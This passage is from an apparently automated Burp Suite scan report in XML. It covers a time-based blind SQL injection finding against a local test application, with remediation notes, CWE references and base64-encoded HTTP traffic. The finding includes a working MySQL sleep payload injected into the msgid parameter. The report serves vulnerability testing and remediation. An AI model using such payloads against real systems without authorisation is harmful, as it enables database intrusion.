  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>msgid</b> parameter appears to be vulnerable to SQL injection attacks. The payload <b>(select*from(select(sleep(20)))a)</b> was submitted in the msgid parameter. The application took <b>20004</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC01MDBFcnJvci9DYXNlMTktSW5qZWN0aW9uSW5VcGRhdGUtTnVtZXJpY1dpdGhvdXRRdW90ZXMtQ29tbWFuZEluamVjdGlvbi1XaXRoRXJyb3JzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogNw0KT3JpZ2luOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwDQpSZWZlcmVyOiBodHRwOi8vMTI3LjAuMC4xOjE4MDgwL3dhdnNlcC9hY3RpdmUvU1FMLUluamVjdGlvbi9TSW5qZWN0aW9uLURldGVjdGlvbi1FdmFsdWF0aW9uLVBPU1QtNTAwRXJyb3IvQ2FzZTE5LUluamVjdGlvbkluVXBkYXRlLU51bWVyaWNXaXRob3V0UXVvdGVzLUNvbW1hbmRJbmplY3Rpb24tV2l0aEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCm1zZ2lkPShzZWxlY3QqZnJvbShzZWxlY3Qoc2xlZXAoMjApKSlhKQ==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjQ4OjM1IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiAzNjANCg0KCgoKPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+CjxodG1sPgo8aGVhZD4KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9SVNPLTg4NTktMSI+Cjx0aXRsZT5DYXNlIDE5IC0gSW5qZWN0aW9uIGludG8gbnVtZXJpYyB2YWx1ZXMgaW4gYW4gdXBkYXRlIHBhZ2Ugd2l0aCBlcnJvbmVvdXMgcmVzcG9uc2VzIGFuZCBxdW90ZSB2YWxpZGF0aW9uPC90aXRsZT4KPC9oZWFkPgo8Ym9keT4KClF1ZXJ5IGV4ZWN1dGVkCgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
</issues>
